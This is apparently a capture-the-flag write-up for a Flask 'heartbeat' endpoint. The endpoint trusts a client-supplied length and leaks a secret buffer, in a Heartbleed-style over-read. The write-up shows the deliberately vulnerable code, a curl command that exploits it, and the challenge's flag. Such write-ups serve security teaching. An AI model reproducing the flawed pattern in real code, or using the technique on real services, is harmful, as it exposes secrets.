# Akemi’s Heart

<img width="787" height="333" alt="Screenshot 2025-09-15 120024" src="https://github.com/user-attachments/assets/fce1f475-f0de-404b-8364-76c7ee4a7f4d" />

## Challenge

<img width="791" height="614" alt="Screenshot 2025-09-15 120250" src="https://github.com/user-attachments/assets/6da94418-e2b9-4f65-a8b2-abf3d54e0dba" />

A Flask app exposes `POST /heartbeat` that echoes your JSON:
```json
{"payload": "hi", "length": 5}
```

It always returns exactly length bytes. If your payload is shorter, it pads with a secret buffer `secret_blob`. That buffer is:

512 random bytes followed by the contents of `/flag.txt`

Code snippet: 

```python
# secret buffer = random junk + flag
secret_blob = secrets.token_bytes(512)
if os.path.exists("/flag.txt"):
    with open("/flag.txt", "rb") as f:
        secret_blob += f.read()

# heartbeat endpoint
data = request.get_json(force=True, silent=True)
payload_bytes = (data.get("payload", "")).encode()
length = int(data.get("length", 0))

extra_needed = length - len(payload_bytes)
if extra_needed <= 0:
    resp = payload_bytes[:length]
else:
    # BUG: trusts client `length`, pads with secret data
    resp = payload_bytes + secret_blob[:extra_needed]
return make_response(resp, 200, {"Content-Type": "application/octet-stream"})
```

## Solution
Exploit the trusted `length`: send a tiny (or empty) `payload` with a large `length`.
The server pads with `secret_blob`, and after the first 512 random bytes, the flag appears.

Notes:

- Any `length > 512 + len(payload)` works (e.g., 1024, 2048, 4096, 8192).
- Filter output for keywords like `GCTF`, `flag`, `ctf`.

```bash
curl -s http://host:port/heartbeat -H "Content-Type: application/json" -d '{"payload":"","length":8192}' | grep -iE "flag|ctf|gctf"
```

## Flag

```flag
GCTF25{aK4mI_H3ARTY_tl$SU3_saD_so_$AD_c1737cad162e}
```



